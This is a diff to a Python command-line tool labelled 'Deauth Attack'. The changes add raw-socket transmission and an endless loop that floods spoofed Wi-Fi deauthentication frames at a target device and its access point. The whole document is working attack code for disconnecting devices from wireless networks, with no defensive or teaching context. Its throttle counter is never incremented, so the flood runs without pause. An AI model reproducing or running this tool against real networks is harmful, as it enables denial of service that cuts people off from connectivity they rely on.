@@ -1,24 +1,43 @@
 import struct
 import sys
+import time
 from argparse import ArgumentParser as ArgParser
+from socket   import socket, AF_PACKET, SOCK_RAW, htons
 
 
 
 class Deauthenticator:
 
-    __slots__ = ('_args', '_ap_frame', '_target_frame', '_seq_ctrl')
+    __slots__ = ('_args', '_ap_frame', '_target_frame', '_seq_ctrl', '_socket')
 
     def __init__(self):
         self._args:         ArgParser = None
         self._ap_frame:     bytearray = bytearray(38)
         self._target_frame: bytearray = bytearray(38)
         self._seq_ctrl:     int       = 0
+        self._socket:       socket    = None
 
 
 
     def execute(self):
-        self._parse_arguemnts()
-        self._build_frames()
+        try:
+            self._parse_arguemnts()
+            self._build_frames()
+            self._create_socket()
+            self._display_exec_info()
+            self._flush_unnecessary_data()
+            self._send_endlessly()
+        except KeyboardInterrupt:
+            print('\nExecution interrupted by the user')
+        except Exception as e:
+            self._abort(e)
+
+        
+    
+    @staticmethod
+    def _abort(msg: str):
+        print(f'[ ERROR ] {msg}')
+        sys.exit()
     
 
 
@@ -26,6 +45,7 @@ class Deauthenticator:
         parser = ArgParser(description='Deauth Attack')
         parser.add_argument('-t', '--target', type=str, help='Target MAC')
         parser.add_argument('-b', '--bssid',  type=str, help='BSSID')
+        parser.add_argument('-i', '--iface',  type=str, help='Interface')
         self._args = parser.parse_args(self._get_args())
 
     
@@ -36,19 +56,12 @@ class Deauthenticator:
             Deauthenticator._abort('Missing arguments')
         
         return sys.argv[1:]
-    
-
-
-    @staticmethod
-    def _abort(msg: str):
-        print(f'[ ERROR ] {msg}')
-        sys.exit()
 
 
     
     def _build_frames(self):
-        self._build_frames(self._target_frame, self._args.target, self._args.bssid)
-        self._build_frames(self._ap_frame, self._args.bssid, self._args.target)
+        self._build_fixed_frame_parts(self._target_frame, self._args.target, self._args.bssid)
+        self._build_fixed_frame_parts(self._ap_frame, self._args.bssid, self._args.target)
 
 
 
@@ -87,8 +100,52 @@ class Deauthenticator:
 
 
     def _update_seq_ctrl(self, frame: bytes):
-        seq_ctrl = ((self._seq & 0x0FFF) << 4) & 0xFFFF
+        if self._seq_ctrl >= 4095:
+            self._seq_ctrl = 0
+        
+        self._seq_ctrl += 1
+
+        seq_ctrl = ((self._seq_ctrl & 0x0FFF) << 4) & 0xFFFF
         struct.pack_into('<H', frame, 34, seq_ctrl)
+
+    
+
+    def _create_socket(self):
+        sock = socket(AF_PACKET, SOCK_RAW, htons(0x0003))
+        sock.bind((self._args.iface, 0))
+        self._socket = sock
+
+    
+
+    def _display_exec_info(self):
+        print(f'IFACE....: {self._args.iface}')
+        print(f'TARGET...: {self._args.target}')
+        print(f'BSSID....: {self._args.bssid}')
+
+
+    
+    def _flush_unnecessary_data(self):
+        self._args = None
+
+    
+
+    def _send_endlessly(self):
+        shots = 0
+        
+        while True:
+            self._update_seq_ctrl(self._target_frame)
+            self._socket.send(self._target_frame)
+
+            self._update_seq_ctrl(self._ap_frame)
+            self._socket.send(self._ap_frame)
+
+            if shots >= 128:
+                shots = 0
+                time.sleep(0.3)
+
+
+
+
 
 
 
